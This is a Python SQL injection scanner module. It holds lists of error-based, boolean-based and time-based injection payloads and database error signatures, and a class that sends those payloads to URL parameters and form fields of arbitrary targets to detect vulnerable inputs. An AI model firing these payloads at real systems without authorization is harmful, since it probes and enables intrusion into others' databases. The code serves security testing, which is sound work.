"""
SQL Injection Scanner - Detects Error-based, Boolean-based, and Time-based SQLi.
"""

from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import re
import logging

logger = logging.getLogger(__name__)


# --- Payloads ---

ERROR_PAYLOADS = [
    "'",
    "\"",
    "\\",
    "';--",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1 UNION SELECT NULL--",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 'x'='x", "' OR 'x'='y"),
]

TIME_PAYLOADS = [
    # (payload, expected_delay_seconds)
    ("'; WAITFOR DELAY '0:0:5'--", 5),       # MSSQL
    ("' AND SLEEP(5)--", 5),                  # MySQL
    ("'; SELECT pg_sleep(5)--", 5),           # PostgreSQL
    ("' OR SLEEP(5)--", 5),
    ("1; WAITFOR DELAY '0:0:5'--", 5),
]

# DB-specific error signatures
ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"odbc microsoft access driver",
    r"syntax error converting",
    # PostgreSQL
    r"pg_query\(\): query failed",
    r"unterminated quoted string",
    r"pgsql error",
    # Oracle
    r"ora-\d{5}",
    r"oracle error",
    # SQLite
    r"sqlite3\.operationalerror",
    r"sqlite_error",
    # Generic
    r"sql syntax.*mysql",
    r"syntax error.*sql",
    r"jdbc exception",
    r"division by zero in sql",
]

COMPILED_ERRORS = [re.compile(p, re.IGNORECASE) for p in ERROR_SIGNATURES]


class SQLiScanner:
    """Detects SQL Injection via error-based, boolean-based, and time-based techniques."""

    def __init__(self, session, time_threshold: float = 4.5):
        self.session = session
        self.time_threshold = time_threshold
        self.findings: List[Dict] = []

    def _has_sql_error(self, text: str) -> Optional[str]:
        """Return the matched error pattern or None."""
        for pattern in COMPILED_ERRORS:
            m = pattern.search(text)
            if m:
                return m.group()
        return None

    # ── Error-based ──────────────────────────────────────────────────────────

    def _error_based_scan(self, url: str, params: Dict, param: str) -> Optional[Dict]:
        for payload in ERROR_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload
            resp = self.session.get(url, params=test_params)
            if resp:
                error = self._has_sql_error(resp.text)
                if error:
                    return {
                        "type": "SQLi",
                        "subtype": "Error-Based",
                        "severity": "Critical",
                        "url": url,
                        "parameter": param,
                        "method": "GET",
                        "payload": payload,
                        "evidence": f"DB error signature matched: '{error[:80]}'",
                    }
        return None

    # ── Boolean-based ─────────────────────────────────────────────────────────

    def _boolean_based_scan(self, url: str, params: Dict, param: str) -> Optional[Dict]:
        baseline_resp = self.session.get(url, params=params)
        if not baseline_resp:
            return None
        baseline_len = len(baseline_resp.text)

        for true_payload, false_payload in BOOLEAN_PAIRS:
            true_p = dict(params); true_p[param] = params.get(param, "1") + true_payload
            false_p = dict(params); false_p[param] = params.get(param, "1") + false_payload

            resp_true = self.session.get(url, params=true_p)
            resp_false = self.session.get(url, params=false_p)

            if not resp_true or not resp_false:
                continue

            len_true = len(resp_true.text)
            len_false = len(resp_false.text)
            diff = abs(len_true - len_false)

            # Significant content difference suggests boolean injection
            if diff > 50 and abs(len_true - baseline_len) < diff:
                return {
                    "type": "SQLi",
                    "subtype": "Boolean-Based Blind",
                    "severity": "Critical",
                    "url": url,
                    "parameter": param,
                    "method": "GET",
                    "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                    "evidence": f"Response length differs by {diff} bytes between TRUE/FALSE conditions",
                }
        return None

    # ── Time-based ────────────────────────────────────────────────────────────

    def _time_based_scan(self, url: str, params: Dict, param: str) -> Optional[Dict]:
        for payload, expected_delay in TIME_PAYLOADS:
            test_params = dict(params)
            test_params[param] = params.get(param, "1") + payload

            start = time.time()
            resp = self.session.get(url, params=test_params)
            elapsed = time.time() - start

            if elapsed >= self.time_threshold:
                return {
                    "type": "SQLi",
                    "subtype": "Time-Based Blind",
                    "severity": "Critical",
                    "url": url,
                    "parameter": param,
                    "method": "GET",
                    "payload": payload,
                    "evidence": f"Response delayed {elapsed:.2f}s (threshold: {self.time_threshold}s)",
                }
        return None

    # ── Forms ─────────────────────────────────────────────────────────────────

    def _scan_form(self, form: Dict) -> List[Dict]:
        results = []
        action = form["action"]
        method = form["method"]
        base_data = {i["name"]: i["value"] or "1" for i in form["inputs"]}

        for inp in form["inputs"]:
            param = inp["name"]
            for payload in ERROR_PAYLOADS:
                data = dict(base_data)
                data[param] = payload
                if method == "post":
                    resp = self.session.post(action, data=data)
                else:
                    resp = self.session.get(action, params=data)
                if resp:
                    error = self._has_sql_error(resp.text)
                    if error:
                        results.append({
                            "type": "SQLi",
                            "subtype": "Error-Based",
                            "severity": "Critical",
                            "url": action,
                            "parameter": param,
                            "method": method.upper(),
                            "payload": payload,
                            "evidence": f"DB error: '{error[:80]}'",
                        })
                        break

        return results

    # ── Entry Point ───────────────────────────────────────────────────────────

    def run(self, urls, forms) -> List[Dict]:
        logger.info("[SQLi] Starting scan...")

        for url in urls:
            parsed = urlparse(url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            if not params:
                continue
            for param in params:
                finding = (
                    self._error_based_scan(url, params, param)
                    or self._boolean_based_scan(url, params, param)
                    or self._time_based_scan(url, params, param)
                )
                if finding:
                    self.findings.append(finding)
                    logger.warning(f"[SQLi] Found in param '{param}' at {url}")

        for form in forms:
            self.findings.extend(self._scan_form(form))

        logger.info(f"[SQLi] Done. Findings: {len(self.findings)}")
        return self.findings
